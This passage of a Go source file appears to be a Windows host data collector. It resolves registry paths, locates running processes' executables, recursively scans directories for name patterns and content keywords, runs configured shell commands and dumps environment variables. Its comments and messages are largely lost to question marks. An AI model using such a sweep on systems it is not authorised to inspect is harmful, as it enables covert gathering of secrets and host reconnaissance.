	default:
		return ""
	}
}
func GetSonSpath(spath string, sonName string) string {
	s_spath := spath + "\\" + sonName
	return s_spath
}
func RKeyNamematch(key string, Tkey string, HK registry.Key, f_spath string, coller *Collector) {
	if strings.Contains(key, Tkey) {
		s_spath := f_spath + "\\" + key
		Path := CombinePath(HK, s_spath)
		if !isInArray(&coller.TRKNPathResults, Path) {
			coller.TRKNPathResults = append(coller.TRKNPathResults, Path)
		}

	}
}
func CombinePath(Hk registry.Key, spath string) string {
	switch Hk {
	case registry.CURRENT_USER:
		return "HKEY_CURRENT_USER\\" + spath
	case registry.CLASSES_ROOT:
		return "HKEY_CLASSES_ROOT\\" + spath
	case registry.LOCAL_MACHINE:
		return "HKEY_LOCAL_MACHINE\\" + spath
	case registry.USERS:
		return "HKEY_USERS\\" + spath
	case registry.CURRENT_CONFIG:
		return "HKEY_CURRENT_CONFIG\\" + spath
	default:
		return "error ?????????????????????HK"
	}
}

func GetHKandSpath(path string) (registry.Key, string) {
	spilts := strings.SplitN(path, "\\", 2)
	switch spilts[0] {
	case "HKEY_CURRENT_USER":
		return registry.CURRENT_USER, spilts[1]
	case "HKEY_CLASSES_ROOT":
		return registry.CLASSES_ROOT, spilts[1]
	case "HKEY_LOCAL_MACHINE":
		return registry.LOCAL_MACHINE, spilts[1]
	case "HKEY_USERS":
		return registry.USERS, spilts[1]
	case "HKEY_CURRENT_CONFIG":
		return registry.CURRENT_CONFIG, spilts[1]
	default:
		fmt.Println("???????????????????????????????????????")
	}
	fmt.Errorf("hello error")
	return 0, ""
}

func WormProcesses(Tprocesses []string, coller *Collector) {
	var ProceessDirs []string
	for _, tp := range Tprocesses {
		checkProcessExist(tp, coller)
	}
	fmt.Println("====================================??????path??????=============================================")
	for _, path := range coller.targetProcessPaths {
		fmt.Println(path)
		Proceessdir := filepath.Dir(path)
		ProceessDirs = append(ProceessDirs, Proceessdir)
	}
	fmt.Println("====================================????????????????????????=============================================")
	WormFiles(ProceessDirs, coller)
}

func GetProcesses() (pns []*process.Process) {

	pids, _ := process.Pids()
	for _, pid := range pids {

		pn, _ := process.NewProcess(pid)
		pns = append(pns, pn)

	}
	return pns
}
func checkProcessExist(tp string, coller *Collector) {
	ExistErrorFlag := true
	PathErrorFlag := true
	Pns := GetProcesses()

for1:
	for _, p := range Pns {
		Name, _ := p.Name()
		if tp == Name {
			ExistErrorFlag = false
			//????????????exe????????????
			Exe, _ := p.Exe()
			if Exe != "" || len(Exe) != 0 {
				if !isInArray(&coller.targetProcessPaths, Exe) {
					coller.targetProcessPaths = append(coller.targetProcessPaths, Exe)
					PathErrorFlag = false
					break for1
				}
				println(Exe + "?????????????????????????????????")
			}
		}
	}
	if ExistErrorFlag {
		println(tp + "?????????????????????")
	}
	if PathErrorFlag {
		println(tp + "????????????????????????????????????????????????system32??????????????????")
	}
}

func WormCommand(coller *Collector) {
	for _, cmd := range coller.Commands {
		coller.CommandResults = append(coller.CommandResults, runCmd(cmd))
	}
	CommandResultslog(coller.CommandResults)
}
func CommandResultslog(crs []string) {
	x := 1
	for _, r := range crs {
		fmt.Printf("=======================???%v???????????????============================\n", x)
		fmt.Println(r)
		x++
	}
}

func GetCommandResults(crs []string) string {
	var result string
	x := 1
	for _, r := range crs {
		result += fmt.Sprintf("=======================???%v???????????????============================\n", x)
		result += fmt.Sprintln(r)
		x++
	}
	return result

}
func InitSystemPath(p string) string {
	spilts := strings.SplitN(p, "%", 3)
	path := fmt.Sprint(spilts[0]) + os.Getenv(spilts[1]) + fmt.Sprint(spilts[2])
	return path
}
func WormFiles(locations []string, coller *Collector) {
	for _, location := range locations {
		//%DATA%??????????????????
		if strings.Contains(location, "%") {
			location = InitSystemPath(location)
		}
		fileScan(location, coller)
	}

	if coller.ContentKeys != nil && len(coller.ContentKeys) != 0 {
		for _, location := range coller.FliesScanTargets {
			if !IsDir(location) {
				FileContentScan(location, coller)
			}
		}
	}

	fmt.Println("==================?????????????????????====================================\n")
	Fmtlog(coller.FliesScanTargets)
	fmt.Println("\n\n\n==================?????????????????????====================================\n")
	Fmtlog(coller.ContentScanTagerts)
}

func fileScan(location string, coller *Collector) {
	if IsDir(location) {
		DirScan(location, coller)
	} else {
		FileContentScan(location, coller)

	}
}

func readCurrentDir(arg string) string {
	var returnString string
	file, err := os.Open(arg)
	if err != nil {
		fmt.Println("failed opening directory: %s", err)
	}
	defer file.Close()

	fileList, err := file.Readdir(0)
	if err != nil {
		fmt.Errorf("%s", err.Error())
	}

	returnString += fmt.Sprintf("\nName\t\t\tSize\t\tIsDirectory  \t\tLast Modification\n")
	for _, files := range fileList {
		s := fmt.Sprintf("\n%-15s %-14v %-12v %v", files.Name(), files.Size(), files.IsDir(), files.ModTime())
		returnString += s
	}
	return returnString
}

func getEnvs() string {
	var returnStr string
	envs := os.Environ()

	for _, e := range envs {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		} else {
			str := string(parts[0]) + "=" + string(parts[1]) + "\n"
			returnStr += str
		}
	}
	return returnStr

}

func runCmd(cmdStr string) string {

	list := strings.Split(cmdStr, " ")
	if list[0] == "dir" {
		if len(list) != 1 {
			return readCurrentDir(list[1])
		} else {
			return readCurrentDir(".")
		}
	}
	if list[0] == "set" {
		return getEnvs()
	}

	cmd := exec.Command(list[0], list[1:]...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		value, _ := GbkToUtf8(stderr.Bytes())
		return string(value)
	} else {
		value, _ := GbkToUtf8(out.Bytes())
		return string(value)
	}
}

func GbkToUtf8(s []byte) ([]byte, error) {
	//?????????????????????transform.Transformer????????????simplifiedchinese.GBK.NewDecoder()??????????????????
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func FileContentScan(location string, coller *Collector) {
	if !isInArray(&coller.SuffixTypes, "*") {
		if !isInArray(&coller.SuffixTypes, path.Ext(location)) {
			println("=========????????????Suffix" + location)
			return
		}
	}

	//???????????????????????????
	sF, err1 := os.Open(location)
	if err1 != nil {
		fmt.Println("err1=", err1)
		return
	}
	defer sF.Close()
	buf := make([]byte, 4*1024) //4k?????????????????????
	var tagetb []byte
	for {
		_, err := sF.Read(buf) //????????????????????????,?????????????????????
		if err != nil {
			if err == io.EOF { //??????????????????
				break
			}
			fmt.Println("err=", err)

		}
		//???????????????????????????????????????
		tagetb = append(tagetb, buf...)
	}
	if len(tagetb) != 0 {
		str := string(DecodeToUtf8(tagetb))
		SearchTo(location, str, coller)
	}

}

func SearchTo(location string, content string, coller *Collector) {
	//???????????????????????????
	for _, key := range coller.ContentKeys {
		indexs := GetTagertIndexs(content, key)
		for _, index := range indexs {
			a := strings.Split(string(content[index:]), "\r")
			result := fmt.Sprintf("???????????????%v \t\t ????????????%v", location, a[0])
			if !isInArray(&coller.ContentScanTagerts, result) {
				coller.ContentScanTagerts = append(coller.ContentScanTagerts, result)
				coller.ContentTargetsPath = append(coller.ContentTargetsPath, location)
			}

		}
	}
}

// ??????key???Str????????????????????????
func GetTagertIndexs(Str string, key string) []int {
	var indexs []int
	var spilts []string
	sum := 0
	count := strings.Count(Str, key)
	for i := 0; i < count; i++ {
		index := strings.Index(Str, key)
		index = index + sum
		indexs = append(indexs, index)
		spilts = strings.SplitN(Str, key, 2)
		Str = spilts[len(spilts)-1]
		sum = index + len(key)
	}
	return indexs
}

func DecodeToUtf8(contents []byte) []byte {

	r := bytes.NewReader(contents)
	d, _ := charset.NewReader(r, "gb2312")
	content, _ := ioutil.ReadAll(d)
	return content
}
func DirScan(location string, coller *Collector) {
	var dirfiles []string
	err := GetAllFile(location, &dirfiles, &coller.SuffixTypes, &ignoreFile, &ignorePath, &ignoreType)
	if err != nil {
		fmt.Printf(err.Error() + "\n")
		return
	}
	if coller.NameKeys == nil || isInArray(&coller.NameKeys, "*") || len(coller.NameKeys) == 0 {
		for _, file := range dirfiles {
			if IsDir(file) {
				DirScan(file, coller)
			} else {
				coller.FliesScanTargets = append(coller.FliesScanTargets, file)
			}
		}
	} else {
		for _, file := range dirfiles {
			for _, key := range coller.NameKeys {
				FileNameScan(file, key, coller)
			}
			// ?????????????????????????????????
			if IsDir(file) {

				DirScan(file, coller)
			}
		}
	}

}

func Fmtlog(strs []string) {
	for _, str := range strs {
		fmt.Println(str)
	}
}
func FmtGet(strs []string) string {
	var result string
	for _, str := range strs {
		result += fmt.Sprintln(str)
	}
	return result
}

func FileNameScan(file string, key string, coller *Collector) {
	fname := filepath.Base(file)

	split := strings.SplitN(fname, ".", 2)
	//???????????????????????????
	if isMatch(split[0], key) {
		if !isInArray(&coller.FliesScanTargets, file) {
			coller.FliesScanTargets = append(coller.FliesScanTargets, file)
		}

	}
}

func isMatch(str, key string) bool {
	i := 0
	j := 0
	start := -1
	math := 0
	m := len(str)
	n := len(key)
	for i < m {
		if j < n && (str[i] == key[j] || key[j] == '?') {
			i++
			j++
		} else if j < n && key[j] == '*' {
			start = i
			math = j
			j++
		} else if start != -1 {
			j = start + 1
			math++
			i = math

		} else {
			return false
		}
	}
	for j < n {
		if key[j] != '*' {
			return false
		}
		j++
	}
	return true
}

func IsDir(name string) bool {
	if info, err := os.Stat(name); err == nil {
		return info.IsDir()
	}
	return false
}
func (cc CollectConfig) FindByShortName(short_name string) Collector {
	var targetCollector Collector
	for _, collector := range cc.Collectors {
		if collector.ShortName == short_name {
			targetCollector = collector
		}
	}
	return targetCollector
}

func (cc CollectConfig) FindByType(_type string) []*Collector {
	var targetCollectors []*Collector
	for _, collector := range cc.Collectors {
		if collector.CollectorType == _type {
			newcoller := collector
			targetCollectors = append(targetCollectors, &newcoller)
		}
	}
	return targetCollectors
}

func GetAllFile(path string, files *[]string, targetType *[]string, ignoreFile *[]string, ignorePath *[]string, ignoreType *[]string) (err error) {

	if !isAllEmpty(targetType) && !isAllEmpty(ignoreType) {

		fmt.Printf("WARNGING: ???????????????????????????, ?????????????????????????????????????????????????????????????????????????????????\n")
	}

	err = getAllFileRecursion(path, files, targetType, ignoreFile, ignorePath, ignoreType)
	return err
}

// ???????????????????????????????????????????????????
func isAllEmpty(list *[]string) (isEmpty bool) {

	if len(*list) == 0 {
		return true
	}

	isEmpty = true
	for _, f := range *list {

		if strings.TrimSpace(f) != "" {
			isEmpty = false
			break
		}
	}

	return isEmpty
}
func getAllFileRecursion(path string, files *[]string, targetType *[]string, ignoreFile *[]string, ignorePath *[]string, ignoreType *[]string) (err error) {
	l, err := ioutil.ReadDir(path)
	if err != nil {
		return err
	}

	separator := string(os.PathSeparator)
	for _, f := range l {
		tmp := string(path + separator + f.Name())

		if f.IsDir() {
			*files = append(*files, tmp)
			// ?????????????????????????????????????????????????????????
			if !isInArray(ignorePath, f.Name()) {

				err = getAllFileRecursion(tmp, files, targetType, ignoreFile, ignorePath, ignoreType)
				if err != nil {
					return err
				}
			}
		} else {
			// ???????????????????????????
			if !isAllEmpty(targetType) {

				// ????????????????????????
				if isInSuffix(targetType, f.Name()) {

					// ?????????????????? ?????? ??????????????????????????????????????????
					if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

						*files = append(*files, tmp)
					}
				}
			} else { // ????????????????????????

				// ???????????????????????????
				if !isAllEmpty(ignoreType) {

					// ???????????????????????????
					if !isInSuffix(ignoreType, f.Name()) {

						// ?????????????????? ?????? ??????????????????????????????????????????
						if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

							*files = append(*files, tmp)
						}
					}
				} else { // ????????????????????????

					// ?????????????????? ?????? ??????????????????????????????????????????
					if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

						*files = append(*files, tmp)
					}
				}
			}
		}
	}

	return nil
}

// ?????????????????????????????????????????????????????????????????????
func isInSuffix(list *[]string, s string) (isIn bool) {

	isIn = false
	for _, f := range *list {

		if strings.TrimSpace(f) != "" && strings.HasSuffix(s, f) {
			isIn = true
			break
		}
	}

	return isIn
}

// ??????????????????????????????????????????
func isInArray(list *[]string, s string) (isIn bool) {

	if len(*list) == 0 {
		return false
	}

	isIn = false
	for _, f := range *list {

		if f == s {
			isIn = true
			break
		}
	}

	return isIn
}
